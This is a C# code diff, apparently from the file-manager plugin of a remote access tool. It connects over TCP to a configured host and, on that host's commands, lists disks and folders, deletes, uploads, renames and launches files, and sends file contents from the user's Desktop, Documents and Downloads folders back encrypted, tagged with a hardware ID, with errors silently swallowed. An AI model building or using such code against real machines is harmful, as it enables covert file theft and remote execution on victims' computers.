@@ -20,84 +20,71 @@ namespace Plugin
         {
             try
             {
-
                 Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                 S.Connect(ep);
-                Shared.PacketTypes.PacketType T = (Shared.PacketTypes.PacketType)Param[0];
+                PacketType T = (Shared.PacketType)Param[0];
                 Data D = new Data();
+                D.HWID = HWID;
+                D.IP_Origin = BaseIP;
                 switch (T)
                 {
-                    case Shared.PacketTypes.PacketType.GET_D:
-                        await Task.Run(() => Functions.GetDisks(ref D));
-                        D.HWID = HWID;
-                        D.Type = Shared.PacketTypes.PacketType.GET_D;
-                        D.IP_Origin = BaseIP;
+                    case PacketType.GET_D:
+                        await Task.Run(() => Functions.GetDisks(ref D));                   
+                        D.Type = Shared.PacketType.GET_D;
                         await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                         break;
 
-                    case PacketTypes.PacketType.GET_F:
-                        Dictionary<int, List<object[]>> ListOfFilesAndDirs = await Task.Run(() => Functions.GetFilesAndDirs((string)Param[1]));
-                        D.HWID = HWID;
-                        D.Type = Shared.PacketTypes.PacketType.GET_F;
+                    case PacketType.GET_F:
+                        Dictionary<int, List<object[]>> ListOfFilesAndDirs = await Task.Run(() => Functions.GetFilesAndDirs((string)Param[1]));                    
+                        D.Type = Shared.PacketType.GET_F;
                         D.DataReturn = new object[] { ListOfFilesAndDirs };
-                        D.IP_Origin = BaseIP;
                         await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                         break;
 
-                    case PacketTypes.PacketType.DELETE_F:
-                        bool deleted = await Task.Run(() => Functions.DeleteFile(Param[1].ToString()));
-                        D.HWID = HWID;
-                        D.Type = Shared.PacketTypes.PacketType.DELETE_F;
+                    case PacketType.DELETE_F:
+                        bool deleted = await Task.Run(() => Functions.DeleteFile(Param[1].ToString()));                        
+                        D.Type = Shared.PacketType.DELETE_F;
                         D.DataReturn = new object[] { deleted , Param[1].ToString() };
-                        D.IP_Origin = BaseIP;
                         await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                         break;
 
-                    case PacketTypes.PacketType.DOWNLOAD_F:
+                    case PacketType.DOWNLOAD_F:
                         byte[] b = new byte[] { };
-                        bool downloaded = await Task.Run(() => Functions.DownloadFile(Param[1].ToString(),ref b));
-                        D.HWID = HWID;
-                        D.Type = Shared.PacketTypes.PacketType.DOWNLOAD_F;
+                        bool downloaded = await Task.Run(() => Functions.DownloadFile(Param[1].ToString(),ref b));                        
+                        D.Type = Shared.PacketType.DOWNLOAD_F;
                         D.DataReturn = new object[] { downloaded, Param[1].ToString(), b };
-                        D.IP_Origin = BaseIP;
-                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
+                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key)), true));
                         break;
 
-                    case PacketTypes.PacketType.UPLOAD_F:
+                    case PacketType.UPLOAD_F:
                         byte[] file = (byte[])Param[2];
                         bool uploaded = await Task.Run(() => Functions.UploadFile(Param[1].ToString(), file));
                         break;
 
-                    case PacketTypes.PacketType.LAUNCH_F:
+                    case PacketType.LAUNCH_F:
                         bool launched = await Task.Run(() => Functions.LaunchFile(Param[1].ToString()));
                         break;
 
-                    case PacketTypes.PacketType.RENAME_F:
+                    case PacketType.RENAME_F:
                         bool renamed = await Task.Run(() => Functions.RenameFile(Param[1].ToString(), Param[2].ToString()));
                         break;
 
-                    case Shared.PacketTypes.PacketType.SHORTCUT_DESKTOP:
-                        await Task.Run(() => Functions.ShortCutFolder(Environment.SpecialFolder.Desktop ,ref D));
-                        D.HWID = HWID;
-                        D.Type = Shared.PacketTypes.PacketType.SHORTCUT_DESKTOP;
-                        D.IP_Origin = BaseIP;
+                    case PacketType.SHORTCUT_DESKTOP:
+                        await Task.Run(() => Functions.ShortCutFolder(Environment.SpecialFolder.Desktop ,ref D));                      
+                        D.Type = PacketType.SHORTCUT_DESKTOP;
                         await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                         break;
 
-                    case Shared.PacketTypes.PacketType.SHORTCUT_DOCUMENTS:
-                        await Task.Run(() => Functions.ShortCutFolder(Environment.SpecialFolder.MyDocuments, ref D));
-                        D.HWID = HWID;
-                        D.Type = Shared.PacketTypes.PacketType.SHORTCUT_DOCUMENTS;
-                        D.IP_Origin = BaseIP;
+                    case PacketType.SHORTCUT_DOCUMENTS:
+                        await Task.Run(() => Functions.ShortCutFolder(Environment.SpecialFolder.MyDocuments, ref D));                        
+                        D.Type = PacketType.SHORTCUT_DOCUMENTS;
                         await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                         break;
 
-                    case PacketTypes.PacketType.SHORTCUT_DOWNLOADS:
-                        await Task.Run(() => Functions.SpecialShortCutFolder(NativeAPI.Folder.Downloads, ref D));
-                        D.HWID = HWID;
-                        D.Type = Shared.PacketTypes.PacketType.SHORTCUT_DOWNLOADS;
-                        D.IP_Origin = BaseIP;
+                    case PacketType.SHORTCUT_DOWNLOADS:
+                        await Task.Run(() => Functions.SpecialShortCutFolder(NativeAPI.Folder.Downloads, ref D));                   
+                        D.Type = PacketType.SHORTCUT_DOWNLOADS;
                         await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                         break;
 
@@ -106,9 +93,7 @@ namespace Plugin
                 S.Dispose();
 
             }
-            catch (Exception)
-            {
-            }
+            catch {}
             finally
             {
                 Shared.Utils.ClearMem();
